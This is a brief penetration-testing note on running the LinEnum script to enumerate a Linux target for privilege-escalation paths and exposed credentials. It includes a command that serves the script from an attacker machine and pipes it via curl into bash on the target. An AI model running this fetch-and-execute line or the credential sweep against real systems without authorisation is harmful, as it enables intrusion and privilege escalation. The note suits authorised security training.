## Automated Linux local enumeration script

Run `LinEnum.sh` after recording manual identity and network context (`id`, `sudo -l`, `ip a`, `ss -lntup`) to sweep for SUID/SGID binaries, capabilities, cron jobs, writable service paths, and exposed credentials.

```bash
# On Kali: host LinEnum.sh
python3 -m http.server 8000

# On target: run in memory or from /tmp and save output
curl -s http://LHOST:8000/LinEnum.sh | bash -s -- -t > /tmp/linenum.txt
```

- `-t` enables thorough checks (can be slow on large filesystems).
- Always verify automated findings manually before attempting privilege escalation; see the [Linux Privilege Escalation Checklist](/privesc/linux-privesc-checklist).
- Reference: [LinEnum GitHub Repository](https://github.com/rebootuser/LinEnum)
